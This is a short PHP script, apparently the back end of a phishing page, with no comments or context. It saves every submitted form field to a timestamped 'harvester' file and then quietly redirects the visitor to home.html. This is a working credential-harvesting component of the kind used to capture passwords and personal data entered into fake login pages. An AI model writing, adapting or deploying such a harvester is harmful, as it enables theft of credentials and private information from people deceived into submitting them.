<?php
$file = 'harvester_' . date("Ymd_His") . '.txt';
$data = "";
foreach ($_POST as $key => $value) {

    $data .= "PARAM: " . $key . " = " . $value . "\n";
}
file_put_contents($file, $data, FILE_APPEND);
header("Location:home.html");
exit();
?>
